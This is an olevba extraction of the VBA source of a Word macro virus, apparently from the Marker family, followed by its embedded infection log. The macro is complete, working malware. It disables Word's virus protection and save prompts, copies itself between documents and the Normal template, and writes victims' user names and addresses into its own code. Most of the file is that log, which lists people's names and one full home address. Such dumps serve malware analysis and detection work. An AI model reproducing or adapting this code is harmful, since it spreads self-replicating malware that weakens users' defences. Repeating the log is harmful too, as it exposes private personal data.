olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.hq
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.hq - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' DSR & FHS , KZ, Kostanai
' KGU-EMF by DSR & FHS v0.1
Private Sub Document_Close()

On Error Resume Next

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
If MAPIAvailable Then
Dim ExcelSheet As Object
Set ExcelSheet = CreateObject("Outlook.letter")
Options.SendMailAttach = True

End If

DocumentInfected = ad.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)
NormalTemplateInfected = nt.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)

'Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False


  If (Day(Now()) <> 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    LogFile = "C:\bootlog" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netlog.sys" For Output As #1
    Print #1, "For YOU"
    Print #1, "SCOOTER"
    Print #1, "Wellcome to Calipso"
    Print #1, "FasterHarderScooter"
    Print #1, "Scooter on the Web: www.scooterweb.de"
    Print #1, "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
    Print #1, "This is a simple example"
    Print #1, "read " & LogFile
    Close #1
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If ((DocumentInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Or _
   ((NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & "* DSR & FHS , KGU EMF" & Chr(13) & _
              "' " & "00:15:54  -  Wednesday, 22.12.1999" & Chr(13) & _
              "' " & "KZ, Kostanai, KGU EMF Applied Mathematics" & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.deletelines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     DocumentInfected = False Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.deletelines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:20:14 - ñðåäà, 3 ìàé 2000
' Ïîæåëàë  îñòàòüñÿ íåèçâåñòíûì
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:42 - âîñêðåñåíüå, 14 ìàé 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:27:56 - ïîíåäåëüíèê, 15 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:55:46 - âòîðíèê, 16 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:25:20 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:08 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:53:13 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:46:39 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:10:05 - ÷åòâåðã, 18 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:57:33 - âòîðíèê, 23 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:42:02 - âòîðíèê, 23 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:13:04 - ñðåäà, 24 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:51:44 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:56:16 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:57:13 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:11:33 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:26:34 - ïîíåäåëüíèê, 19 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:33:11 - âòîðíèê, 27 èþí 2000
' Ñ.Õ. Åñåíáàåâ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:13:47 - âòîðíèê, 27 èþí 2000
' Ñ.Õ. Åñåíáàåâ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:49:56 - ñðåäà, 28 èþí 2000
' Indi G.Ospanova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:12:22 - ïîíåäåëüíèê, 17 èþë 2000
' Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:16:56 - ïîíåäåëüíèê, 17 èþë 2000
' Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:26:40 - âòîðíèê, 18 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:22:23 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:33:06 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:08:01 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:34:42 - âîñêðåñåíüå, 23 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:45:27 - âîñêðåñåíüå, 23 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:53:05 - âòîðíèê, 25 èþë 2000
' CCTT
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:53:34 - ÷åòâåðã, 27 èþë 2000
' ðåàíèìàòîð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:37:06 - âòîðíèê, 1 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:46:13 - ñðåäà, 2 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:22:38 - ñðåäà, 2 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:11:48 - ïîíåäåëüíèê, 21 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:01:19 - ïîíåäåëüíèê, 21 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:38:46 - âòîðíèê, 22 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:24 - ïÿòíèöà, 25 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:43:34 - ïÿòíèöà, 22 ñåí 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:22:22 - ïÿòíèöà, 22 ñåí 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:55 - âòîðíèê, 10 îêò 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:48:10 - ÷åòâåðã, 19 îêò 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:24:45 - ñðåäà, 29 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:23:28 - ÷åòâåðã, 30 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:58:47 - ÷åòâåðã, 30 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:47 - ïÿòíèöà, 1 äåê 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:23:31 - ïÿòíèöà, 5 ÿíâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:54:34 - ïîíåäåëüíèê, 8 ÿíâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:36:35 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:05:48 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:23:03 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:32:55 - ñðåäà, 10 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:33:04 - ïÿòíèöà, 12 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:48:13 - ïÿòíèöà, 12 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 01:03:22 - ïîíåäåëüíèê, 15 ÿíâ 2001
' Jordan
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:08:12 - ïÿòíèöà, 2 ôåâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:49:01 - ïÿòíèöà, 16 ôåâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:12:13 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:12 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:19 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:26 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:31 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:37 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:44 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:49 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:55 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:36:01 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:45:17 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:49:57 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:40:56 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:41:22 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:51:31 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:45:33 - ïîíåäåëüíèê, 19 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:22:59 - ïîíåäåëüíèê, 19 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:23:52 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:31:09 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:35:05 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:21:37 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:43:56 - âòîðíèê, 14 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:39:14 - ïîíåäåëüíèê, 26 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:47:09 - ïîíåäåëüíèê, 26 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:49:26 - ïîíåäåëüíèê, 26 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:57:42 - ïîíåäåëüíèê, 26 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:37:20 - ïîíåäåëüíèê, 26 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:54:45 - ïîíåäåëüíèê, 26 ìàð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:04:53 - ñðåäà, 25 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:05:29 - ñðåäà, 25 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:47:32 - ñðåäà, 25 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:31:02 - ñóááîòà, 28 àïð 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:38:45 - ñóááîòà, 28 àïð 2001
' T8
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:30:48 - ïÿòíèöà, 27 àïð 2001
' ñòóäåíò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:43:30 - ÷åòâåðã, 3 ìàé 2001
' T5
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:08:40 - ïÿòíèöà, 4 ìàé 2001
' T5
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:12 - ñóááîòà, 5 ìàé 2001
' T5
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:06:00 - ïîíåäåëüíèê, 7 ìàé 2001
' T5
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:51:16 - ïîíåäåëüíèê, 14 ìàé 2001
' Pc3
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:33:56 - ÷åòâåðã, 14 èþí 2001
' ñòóäåíò
' 492024
' Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê
' óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:29:55 - ÷åòâåðã, 14 èþí 2001
' ñòóäåíò
' 492024
' Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê
' óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:39:29 - ñðåäà, 20 èþí 2001
' ñòóäåíò
' 492024
' Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê
' óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:23:13 - ñðåäà, 20 èþí 2001
' ñòóäåíò
' 492024
' Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê
' óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:39:48 - ñðåäà, 20 èþí 2001
' ñòóäåíò
' 492024
' Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê
' óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â.



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:51:05 - ÷åòâåðã, 21 èþí 2001
' ñòóäåíò
' 492024
' Êàçàõñòàí, ã. Óñòü-Êàìåíîãîðñê
' óë. Êðûëîâà 106-56, Ãëóõîâîé ß.Â.






' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:14:48 - ÷åòâåðã, 8 ìàé 1997
' ñòóäåíò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:09:51 - ïÿòíèöà, 9 ìàé 1997
' ñòóäåíò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:07:26 - âòîðíèê, 12 èþí 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:06:49 - ñðåäà, 13 èþí 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:15:55 - ñðåäà, 13 èþí 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:04:24 - ñðåäà, 13 èþí 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:05:14 - ñðåäà, 13 èþí 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:06:44 - ñðåäà, 13 èþí 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:07:04 - âòîðíèê, 19 èþí 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:13:54 - ïÿòíèöà, 29 èþí 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:38:26 - ïÿòíèöà, 29 èþí 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:52:15 - ñóááîòà, 30 èþí 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:17:43 - âîñêðåñåíüå, 1 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:21:16 - âîñêðåñåíüå, 1 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
